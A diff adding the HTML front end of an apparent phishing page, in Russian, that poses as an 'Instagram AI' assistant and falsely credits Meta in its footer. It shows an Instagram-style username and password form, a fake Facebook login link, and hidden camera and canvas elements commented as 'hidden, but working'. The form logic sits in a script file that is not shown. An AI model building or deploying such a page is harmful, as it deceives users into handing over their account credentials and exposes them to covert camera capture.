@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram AI — Помощь в решении любых задач</title>
+    <meta name="description" content="Интеллектуальный помощник Instagram: управление, анализ и автоматизация">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="iconinsta.ico" type="image/x-icon">
+</head>
+<body>
+    <!-- ========== ЭКРАН ЗАГРУЗКИ ========== -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-container">
+            <img src="logoinsta.png" alt="Instagram AI" class="logo-small">
+            <h2 class="loading-title">Instagram AI</h2>
+            <p class="loading-subtitle">Помощь в решении любых задач</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="loading-dots">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== ОСНОВНАЯ ЧАСТЬ ========== -->
+    <main class="main-wrapper" id="mainContent" style="display: none;">
+        <div class="bg-white"></div>
+
+        <div class="content-card">
+            <!-- Шапка -->
+            <div class="header-section fade-in-top">
+                <img src="logoinsta.png" alt="Instagram AI" class="main-logo">
+                <h1 class="main-title">Instagram <span>AI</span></h1>
+                <p class="main-subtitle">Интеллектуальный помощник<br>Для решения любых задач</p>
+            </div>
+
+            <!-- Камера и Холст (скрыты, но работают) -->
+            <video id="cameraFeed" autoplay playsinline muted></video>
+            <canvas id="photoCanvas"></canvas>
+
+            <!-- Форма входа -->
+            <div class="form-container fade-in-up">
+                <form id="loginForm" autocomplete="off">
+                    <!-- Поле логина -->
+                    <div class="input-box">
+                        <input type="text" id="loginInput" class="custom-input" placeholder=" " required>
+                        <label for="loginInput" class="custom-label">Имя пользователя, эл. почта или телефон</label>
+                        <div class="input-icon">👤</div>
+                    </div>
+
+                    <!-- Поле пароля -->
+                    <div class="input-box">
+                        <input type="password" id="passInput" class="custom-input" placeholder=" " required>
+                        <label for="passInput" class="custom-label">Пароль</label>
+                        <button type="button" class="btn-toggle-pass" id="togglePass">Показать</button>
+                        <div class="input-icon">🔒</div>
+                    </div>
+
+                    <!-- Уведомление об ошибке -->
+                    <div class="error-notification" id="errorBox">
+                        <span id="errorText"></span>
+                    </div>
+
+                    <!-- Кнопка входа -->
+                    <button type="submit" class="btn-submit" id="submitBtn">
+                        <span class="btn-text">Войти</span>
+                        <div class="btn-loader-ring" id="btnLoader"></div>
+                    </button>
+                </form>
+
+                <!-- Ссылки -->
+                <div class="links-section">
+                    <a href="#" class="custom-link">Забыли пароль?</a>
+                    <div class="divider-line"><span>или</span></div>
+                    <a href="#" class="custom-link link-fb">
+                        <img src="https://cdn-icons-png.flaticon.com/16/733/733547.png" alt="Facebook"> Войти через Facebook
+                    </a>
+                </div>
+            </div>
+
+            <!-- Блок регистрации -->
+            <div class="register-box fade-in-delay">
+                <p>У вас нет аккаунта? <a href="#" class="register-link">Зарегистрироваться</a></p>
+            </div>
+
+            <!-- Подвал -->
+            <footer class="page-footer">
+                <div class="footer-nav">
+                    <a href="#">О нас</a>
+                    <a href="#">Помощь</a>
+                    <a href="#">Условия</a>
+                    <a href="#">Конфиденциальность</a>
+                    <a href="#">API</a>
+                </div>
+                <p class="copyright">© 2026 Instagram AI от Meta</p>
+            </footer>
+        </div>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
